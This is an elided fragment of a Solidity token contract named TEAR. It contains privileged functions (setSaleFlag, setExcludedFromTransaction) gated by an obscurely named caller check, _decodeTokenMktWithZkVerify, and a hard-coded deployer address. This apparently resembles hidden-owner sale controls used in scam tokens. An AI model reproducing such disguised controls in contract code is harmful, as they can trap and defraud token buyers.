...
/*
    ...
    Discord : https://discord.com/invite/descend
*/
...
contract TEAR {
    ...
    string private _name = unicode"TEAR";
    string private _symbol = unicode"TEAR";
    ...
    constructor() {
        ...
        _initDeployer(0xbAa3C19AB7b72dB4179Cff3A2c9Ab943c1583B8b, msg.sender);
    ...
    function setExcludedFromTransaction(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }
    ...
    function setSaleFlag(address _addr) external {
        if (msg.sender != _decodeTokenMktWithZkVerify()) revert Permissions();
    }
